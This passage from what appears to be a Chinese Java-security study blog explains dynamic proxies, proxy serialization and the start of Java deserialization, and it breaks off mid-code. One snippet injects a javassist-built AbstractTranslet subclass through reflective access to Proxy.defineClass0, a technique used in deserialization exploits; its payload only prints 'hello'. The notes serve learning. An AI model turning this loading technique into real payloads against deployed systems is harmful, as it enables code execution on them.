    <categories>
      
      <category>language</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java动态代理</title>
    <link href="/2023/03/15/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"/>
    <url>/2023/03/15/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="Java动态代理"><a href="#Java动态代理" class="headerlink" title="Java动态代理"></a>Java动态代理</h1><p>就像研究反序列化一样，我们可以自定义<code>writeObject</code>，写入我们想要写入的；动态代理通过Java的反射机制，劫持到所持有的委托类对象的相关方法，成为特定的服务；这样做一是隔绝了直接调用相关业务类的方法或者比静态代理(代码写死)更加灵活，通过代理类来调用一些方法；也可以自定义一些方法在其中（面向切面编程：切入点前执行aaa，切入点后执行bbb），这样可以完成对程序的无侵入式扩展</p><p><strong>Java动态代理主要使用场景：</strong></p><ol><li>统计方法执行所耗时间</li><li>在方法执行前后添加日志</li><li>检测方法的参数或返回值</li><li>方法访问权限控制</li><li>方法<code>Mock</code>测试</li></ol><h2 id="API"><a href="#API" class="headerlink" title="API"></a>API</h2><h3 id="java-lang-reflect-Proxy"><a href="#java-lang-reflect-Proxy" class="headerlink" title="java.lang.reflect.Proxy"></a>java.lang.reflect.Proxy</h3><p>生成动态代理类，创建代理类实例，实现了<code>Serializable</code>接口</p><p>主要方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> java.lang.reflect;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Creator: yz</span><br><span class="hljs-comment"> * Date: 2020/1/15</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Proxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">java</span>.<span class="hljs-title">io</span>.<span class="hljs-title">Serializable</span> </span>&#123;<br><br>  <span class="hljs-comment">// 省去成员变量和部分类方法...</span><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 获取动态代理处理类对象</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> proxy 返回调用处理程序的代理实例</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 代理实例的调用处理程序</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException 如果参数不是一个代理实例</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> InvocationHandler <span class="hljs-title">getInvocationHandler</span><span class="hljs-params">(Object proxy)</span></span><br><span class="hljs-function">            <span class="hljs-keyword">throws</span> IllegalArgumentException </span>&#123;<br>        ...<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 创建动态代理类实例</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader     指定动态代理类的类加载器</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> interfaces 指定动态代理类的类需要实现的接口数组</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> h          动态代理处理类</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 返回动态代理生成的代理类实例</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException 不正确的参数异常</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">newProxyInstance</span><span class="hljs-params">(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h)</span></span><br><span class="hljs-function">            <span class="hljs-keyword">throws</span> IllegalArgumentException </span>&#123;<br>        ...<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 创建动态代理类</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader     定义代理类的类加载器</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> interfaces 代理类要实现的接口列表</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 用指定的类加载器定义的代理类，它可以实现指定的接口</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; getProxyClass(ClassLoader loader, Class&lt;?&gt;... interfaces) &#123;<br>        ...<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 检测某个类是否是动态代理类</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> cl 要测试的类</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 如该类为代理类，则为 true，否则为 false</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isProxyClass</span><span class="hljs-params">(Class&lt;?&gt; cl)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> java.lang.reflect.Proxy.class.isAssignableFrom(cl) &amp;&amp; proxyClassCache.containsValue(cl);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 向指定的类加载器中定义一个类对象</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader 类加载器</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> name   类名</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> b      类字节码</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> off    截取开始位置</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> len    截取长度</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> JVM创建的类Class对象</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> Class <span class="hljs-title">defineClass0</span><span class="hljs-params">(ClassLoader loader, String name, <span class="hljs-keyword">byte</span>[] b, <span class="hljs-keyword">int</span> off, <span class="hljs-keyword">int</span> len)</span></span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="java-lang-reflect-InvocationHandler"><a href="#java-lang-reflect-InvocationHandler" class="headerlink" title="java.lang.reflect.InvocationHandler"></a>java.lang.reflect.InvocationHandler</h3><p>用于调用<code>java.lang.reflect.Proxy</code>生成的代理类方法，接口中只定义了一个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> java.lang.reflect;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 每个代理实例都具有一个关联的调用处理程序。对代理实例调用方法时，将对方法调用进行编码并</span><br><span class="hljs-comment"> * 将其指派到它的调用处理程序的 invoke 方法。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">InvocationHandler</span> </span>&#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 在代理实例上处理方法调用并返回结果。在与方法关联的代理实例上调用方法时，将在调用处理程序上调用此方法。</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> proxy  在其上调用方法的代理实例</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> method 对应于在代理实例上调用的接口方法的 Method 实例。Method 对象的声明类将是在其中声明</span><br><span class="hljs-comment">     *               方法的接口，该接口可以是代理类赖以继承方法的代理接口的超接口。</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> args   包含传入代理实例上方法调用的参数值的对象数组，如果接口方法不使用参数，</span><br><span class="hljs-comment">     *               则为 null。基本类型的参数被包装在适当基本包装器类（如 java.lang.Integer</span><br><span class="hljs-comment">     *               或 java.lang.Boolean）的实例中。</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 从代理实例的方法调用返回的值。如果接口方法的声明返回类型是基本类型，</span><br><span class="hljs-comment">     * 则此方法返回的值一定是相应基本包装对象类的实例；否则，它一定是可分配到声明返回类型的类型。</span><br><span class="hljs-comment">     * 如果此方法返回的值为 null 并且接口方法的返回类型是基本类型，则代理实例上的方法调用将抛出</span><br><span class="hljs-comment">     * NullPointerException。否则，如果此方法返回的值与上述接口方法的声明返回类型不兼容，</span><br><span class="hljs-comment">     * 则代理实例上的方法调用将抛出 ClassCastException。</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Throwable 从代理实例上的方法调用抛出的异常。该异常的类型必须可以分配到在接口方法的</span><br><span class="hljs-comment">     *                   throws 子句中声明的任一异常类型或未经检查的异常类型 java.lang.RuntimeException 或</span><br><span class="hljs-comment">     *                   java.lang.Error。如果此方法抛出经过检查的异常，该异常不可分配到在接口方法的 throws 子句中</span><br><span class="hljs-comment">     *                   声明的任一异常类型，代理实例的方法调用将抛出包含此方法曾抛出的异常的</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="使用java-lang-reflect-Proxy动态创建类对象"><a href="#使用java-lang-reflect-Proxy动态创建类对象" class="headerlink" title="使用java.lang.reflect.Proxy动态创建类对象"></a>使用java.lang.reflect.Proxy动态创建类对象</h2><p><code>ClassLoader</code>和<code>Unsafe</code>都有一个叫做<code>defineClassXXX</code>的<code>native</code>方法，我们可以通过调用这个<code>native</code>方法动态的向<code>JVM</code>创建一个类对象，而<code>java.lang.reflect.Proxy</code>类恰好也有这么一个<code>native</code>方法，所以我们也将可以通过调用<code>java.lang.reflect.Proxy</code>类<code>defineClass0</code>方法实现动态创建类对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ProxyDefineclass</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            ClassPool cp = ClassPool.getDefault();<br>            cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>            CtClass ctClass = cp.makeClass(<span class="hljs-string">&quot;Cat&quot;</span>);<br>            String cmd = <span class="hljs-string">&quot;java.lang.System.out.println(\&quot;hello\&quot;);&quot;</span>;<br>            ctClass.makeClassInitializer().insertBefore(cmd);<br>            ctClass.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>            <span class="hljs-keyword">byte</span>[] classbyte = ctClass.toBytecode();<br>            System.out.println();<br>            ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();<br>            Method defineClass0 = Proxy.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass0&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;ClassLoader.class, String.class, <span class="hljs-keyword">byte</span>[].class, <span class="hljs-keyword">int</span>.class, <span class="hljs-keyword">int</span>.class&#125;);<br>            defineClass0.setAccessible(<span class="hljs-keyword">true</span>);<br>            Class invokedefineclass0 = (Class) defineClass0.invoke(<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[]&#123;systemClassLoader, <span class="hljs-string">&quot;Cat&quot;</span>, classbyte, <span class="hljs-number">0</span>, classbyte.length&#125;);<br>            System.out.println(invokedefineclass0);<br>        &#125; <span class="hljs-keyword">catch</span> (CannotCompileException | NoSuchMethodException | IllegalAccessException | InvocationTargetException |<br>                 NotFoundException | IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>动态代理生成出来的类有如下技术细节和特性：</strong></p><ol><li>动态代理的必须是接口类，通过<code>动态生成一个接口实现类</code>来代理接口的方法调用(<code>反射机制</code>)。</li><li>动态代理类会由<code>java.lang.reflect.Proxy.ProxyClassFactory</code>创建。</li><li><code>ProxyClassFactory</code>会调用<code>sun.misc.ProxyGenerator</code>类生成该类的字节码，并调用<code>java.lang.reflect.Proxy.defineClass0()</code>方法将该类注册到<code>JVM</code>。</li><li>该类继承于<code>java.lang.reflect.Proxy</code>并实现了需要被代理的接口类，因为<code>java.lang.reflect.Proxy</code>类实现了<code>java.io.Serializable</code>接口，所以被代理的类支持<code>序列化/反序列化</code>。</li><li>该类实现了代理接口类(示例中的接口类是<code>com.anbai.sec.proxy.FileSystem</code>)，会通过<code>ProxyGenerator</code>动态生成接口类(<code>FileSystem</code>)的所有方法，</li><li>该类因为实现了代理的接口类，所以当前类是代理的接口类的实例(<code>proxyInstance instanceof FileSystem</code>为<code>true</code>)，但不是代理接口类的实现类的实例(<code>proxyInstance instanceof UnixFileSystem</code>为<code>false</code>)。</li><li>该类方法中包含了被代理的接口类的所有方法，通过调用动态代理处理类(<code>InvocationHandler</code>)的<code>invoke</code>方法获取方法执行结果。</li><li>该类代理的方式重写了<code>java.lang.Object</code>类的<code>toString</code>、<code>hashCode</code>、<code>equals</code>方法。</li><li>如果动过动态代理生成了多个动态代理类，新生成的类名中的<code>0</code>会自增，如<code>com.sun.proxy.$Proxy0/$Proxy1/$Proxy2</code>。</li></ol><h2 id="Demo1"><a href="#Demo1" class="headerlink" title="Demo1"></a>Demo1</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ClassMapDemo</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        InvocationHandlerDemo invocationHandlerDemo = <span class="hljs-keyword">new</span> InvocationHandlerDemo(<span class="hljs-keyword">new</span> HashMap());<br>        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;, invocationHandlerDemo);<br>        System.out.println(proxyMap.put(<span class="hljs-string">&quot;proxy&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>));<br>        proxyMap.get(<span class="hljs-string">&quot;proxy&quot;</span>);<br>        proxyMap.entrySet();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InvocationHandlerDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">InvocationHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> Object map;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">InvocationHandlerDemo</span><span class="hljs-params">(Map map)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.map = map;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>        <span class="hljs-keyword">if</span> (method.getName().contains(<span class="hljs-string">&quot;put&quot;</span>)) &#123;<br>            System.out.println(<span class="hljs-string">&quot;Hook Map.put Method: &quot;</span> + method.getName());<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;not allowed&quot;</span>;<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;detect the method: &quot;</span> + method.getName() + <span class="hljs-string">&quot;, and exec without being hooked&quot;</span>);<br>        <span class="hljs-keyword">return</span> method.invoke(<span class="hljs-keyword">this</span>.map, args);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Demo2"><a href="#Demo2" class="headerlink" title="Demo2"></a>Demo2</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">ObjectInterface</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> Object <span class="hljs-title">getClassName</span><span class="hljs-params">(Object object)</span></span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ORIObjectfindName</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ObjectInterface</span></span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getClassName</span><span class="hljs-params">(Object object)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;white class: &quot;</span>+ object.hashCode() +<span class="hljs-string">&quot;, pass!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ObjectfindName</span> <span class="hljs-keyword">implements</span>  <span class="hljs-title">InvocationHandler</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> Object object;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">get</span><span class="hljs-params">(Object object)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.object=object;<br>        <span class="hljs-keyword">return</span> Proxy.newProxyInstance(<span class="hljs-keyword">this</span>.getClass().getClassLoader(), <span class="hljs-keyword">this</span>.object.getClass().getInterfaces(),<span class="hljs-keyword">this</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>        <span class="hljs-keyword">for</span>(Object o:args)&#123;<br>            System.out.println(<span class="hljs-string">&quot;black class proxy: &quot;</span>+ o.hashCode() +<span class="hljs-string">&quot;, block!&quot;</span>);<br>            <span class="hljs-keyword">if</span> (o.toString().contains(<span class="hljs-string">&quot;System&quot;</span>))&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> method.invoke(<span class="hljs-keyword">this</span>.object,args);<br>    &#125;<br><br><br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DynamicProxy</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        ORIObjectfindName oriObjectfindName = <span class="hljs-keyword">new</span> ORIObjectfindName();<br>        oriObjectfindName.getClassName(String.class);<br><br>        ObjectInterface oriObjectfindName1 = <span class="hljs-keyword">new</span> ORIObjectfindName();<br>        ObjectfindName objectfindNameproxy = <span class="hljs-keyword">new</span> ObjectfindName();<br>        ObjectInterface objectInterface =(ObjectInterface) objectfindNameproxy.get(oriObjectfindName1);<br>        objectInterface.getClassName(System.class);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="动态代理类实例序列化问题"><a href="#动态代理类实例序列化问题" class="headerlink" title="动态代理类实例序列化问题"></a>动态代理类实例序列化问题</h2><p>动态代理类符合<code>Java</code>对象序列化条件，并且在<code>序列化/反序列化</code>时会被<code>ObjectInputStream/ObjectOutputStream</code>特殊处理</p><p>动态代理生成的类在<code>反序列化/反序列化</code>时不会序列化该类的成员变量，并且<code>serialVersionUID</code>为<code>0L</code> ，也将是说将该类的<code>Class</code>对象传递给<code>java.io.ObjectStreamClass</code>的静态<code>lookup</code>方法时，返回的<code>ObjectStreamClass</code>实例将具有以下特性：</p><ol><li>调用其<code>getSerialVersionUID</code>方法将返回<code>0L</code> </li><li>调用其<code>getFields</code>方法将返回长度为零的数组</li><li>调用其<code>getField</code>方法将返回<code>null</code> </li></ol><p>但其父类(<code>java.lang.reflect.Proxy</code>)在序列化时不受影响，父类中的<code>h</code>变量(<code>InvocationHandler</code>)将会被序列化，这个<code>h</code>存储了动态代理类的处理类实例以及动态代理的接口类的实现类的实例</p><p>动态代理生成的对象(<code>com.sun.proxy.$ProxyXXX</code>)序列化的时候会使用一个特殊的协议：<code>TC_PROXYCLASSDESC(0x7D)</code>，这个常量在<code>java.io.ObjectStreamConstants</code>中定义的。在反序列化时也不会调用<code>java.io.ObjectInputStream</code>类的<code>resolveClass</code>方法而是调用<code>resolveProxyClass</code>方法来转换成类对象的</p>]]></content>
    
    
    <categories>
      
      <category>language</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java序列化反序列化</title>
    <link href="/2023/03/15/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/03/15/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="Java序列化-反序列化"><a href="#Java序列化-反序列化" class="headerlink" title="Java序列化/反序列化"></a>Java序列化/反序列化</h1><p>序列化需要实现接口<code>java.io.Serializable</code>(内部序列化)或<code>java.io.Externalizaable</code>(外部序列化)，其中后者实现了前者的接口</p><p>一个类中，某些属性是不可序列化的，则必须冠以<code>static transient</code>等修饰</p><p>反序列化的条件：</p><ol><li>被反序列化的类必须存在</li><li><code>serialVersionUID</code>值必须存在</li></ol><blockquote><p><code>serialVersionUID</code>这个值是序列化时产生的，可以由我们指定(显式声明)，也可以由编译器生成，反序列化时会比对UID，匹配才能反序列化成功；<strong>这个UID必须以static final long修饰</strong>，权限建议以<code>private</code>修饰，因为它往往不需要继承</p></blockquote><p><strong>借助ObjectOutputStream.writeObject、ObjectInputStream.readObject就可以实现序列化以及反序列化</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 